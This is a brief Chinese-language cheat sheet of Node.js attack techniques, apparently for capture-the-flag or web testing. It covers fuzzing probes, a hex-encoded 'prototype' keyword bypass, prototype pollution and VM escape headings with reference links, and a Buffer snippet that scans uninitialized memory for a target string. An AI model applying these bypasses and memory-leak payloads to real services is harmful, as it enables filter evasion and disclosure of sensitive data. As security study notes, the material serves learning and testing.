# JavaScript Node js

## Fuzz

- ``Object.getOwnPropertyNames(this)`` 得到依赖包名

- ``Error().stack`` 抛出栈错误

## 绕过

- 数组绕过

- `\x70\x72\x6f\x74\x6f\x74\x79\x70\x65` 编码绕过

## 原型链污染

### 参考资料

https://3nd.xyz/2019/09/10/Summary/Javascript-Prototype-Attack/#0x07-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5

## VM虚拟机逃逸

## Buffer

随机泄露内存
```js
Buffer(100)
```
升级版
```js
for (var step = 0; step < 100000; step++) {
    var buf = (new Buffer(100)).toString('ascii');
    if (buf.indexOf("target") !== -1)  break;
}
buf;
```


### 参考资料

https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md
